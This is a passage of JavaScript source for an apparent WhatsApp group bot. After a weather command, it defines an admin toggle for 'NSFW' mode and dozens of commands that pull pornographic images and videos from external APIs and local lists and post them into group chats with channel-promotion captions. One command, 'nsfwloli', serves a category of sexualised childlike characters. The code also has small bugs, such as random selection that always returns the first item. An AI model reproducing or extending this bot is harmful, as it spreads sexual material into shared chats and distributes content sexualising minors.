            textw += `*Cuacanya :* ${wdata.data.weather[0].main}\n`
            textw += `*Deskripsi :* ${wdata.data.weather[0].description}\n`
            textw += `*Suhu :* ${wdata.data.main.temp}\n`
            textw += `*Terasa Seperti :* ${wdata.data.main.feels_like}\n`
            textw += `*Tekanan :* ${wdata.data.main.pressure}\n`
            textw += `*Kelembapan :* ${wdata.data.main.humidity}\n`
            textw += `*Kelengasan :* ${wdata.data.wind.speed}\n`
            textw += `*Garis Lintang :* ${wdata.data.coord.lat}\n`
            textw += `*Garis Bujur :* ${wdata.data.coord.lon}\n`
            textw += `*Wilayah :* ${text}\n`

           Al.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: floc1,
                }
           )
           }
           break
//========================
case 'nsfw': {
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin & Owner!')
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (args[0] === "on") {
if (AntiNsfw) return m.reply('_Sudah aktif sebelumnya_')
ntnsfw.push(from)
fs.writeFileSync('./search/function/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Successfully Activated Nsfw digrup ini.')
var groupe = await Al.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
await Al.sendMessage(from, {text: `\`\`\`「  ⚠️  Warning  ⚠️   」\`\`\`\n\nNsfw diaktifkan digrup ini, yang berarti seseorang dapat menggunakan fitur ini.`, contextInfo: { mentionedJid : mems }}, {quoted:fkontak})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('_Sudah nonaktif sebelumnya_')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./search/function/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Successfully Deactivation Nsfw digrup ini.')
await Al.sendMessage(from, {text: `\`\`\`「  ⚠️  Warning  ⚠️   」\`\`\`\n\nNsfw dinonaktifkan digrup ini, yang berarti seseorang tidak dapat menggunakan fitur ini.`, contextInfo: { mentionedJid : mems }}, {quoted:fkontak})
} else {
  await m.reply(`Example: ${prefix + command} on\nExample: ${prefix + command} off`)
  }
  }
  break
//========================
case 'hentaivid': 
case 'hentaivideo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
const { hentai } = require('./lib/scraper5.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
Al.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\nCategory : ${result912.category}\nMimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: floc})
            }
            break
//========================
case 'trap' :
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Al.sendMessage(m.chat, { caption: '𝒉𝒂𝒊, 𝑩𝒂𝒏𝒕𝒖 𝒃𝒐𝒕 𝒚𝒖𝒌 𝒅𝒆𝒏𝒈𝒂𝒏 𝒄𝒂𝒓𝒂 𝒇𝒐𝒍𝒍𝒐𝒘 𝒄𝒉𝒂𝒏𝒏𝒆𝒍 ??𝒊𝒃𝒂𝒘𝒂𝒉😇\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R/216\n\n 𝑫𝒂𝒏 𝒌𝒂𝒍𝒂𝒖 𝒌𝒂𝒍𝒊𝒂𝒏 𝒊𝒏𝒈𝒊𝒏 𝒎𝒆𝒏𝒄𝒂𝒓𝒊 𝒈𝒓𝒖𝒑 𝒏𝒈𝒐𝒃𝒓𝒐𝒍 𝒂𝒕𝒂𝒖 𝒎𝒂𝒊𝒏 𝒃𝒐𝒕 𝒍𝒂𝒏𝒈𝒔𝒖𝒏𝒈 𝒂𝒋𝒂 𝒋𝒐𝒊𝒏 𝒅𝒊𝒃𝒂𝒘𝒂𝒉\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝑻𝒆𝒓𝒊𝒎𝒂𝒌𝒂𝒔𝒊𝒉~', image: { url:waifudd.data.url } }, { quoted: m })
break
//========================
case 'hentai-neko' :
case 'hneko' :
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url:waifudd.data.url } }, { quoted: m })
break
//========================
case 'hentai-waifu' :
case 'nwaifu' :
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url:waifudd.data.url } }, { quoted: m })
break
//========================
case 'gasm':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url:waifudd.data.url } }, { quoted: m })
break  
//========================
case 'milf':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break 
//========================
case 'animespank':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
await Al.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})
break
//========================
case 'ahegao':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'bdsm':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'blowjob':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'cuckold':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'cum':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'eba':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'ero':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'femdom':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'foot':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'gangbang':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'glasses':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'hentai1':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'jahy':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'manga':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'masturbation':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'hneko1':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'hneko2':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'nsfwloli':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'orgy':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Al.sendMessage(m.chat, { caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', image: { url: xeonyresult.url } }, { quoted: m })
break
//========================
case 'panties':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!AntiNsfw) return m.reply('Fitur Nsfw dinonaktifkan, Siapapun tidak dapat menggunakan fitur ini karna termasuk *Nsfw*.')
await m.reply('_Loading..._')
var ahegaonsfw = JSON.parse(fs.readFileSync('./media/others/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
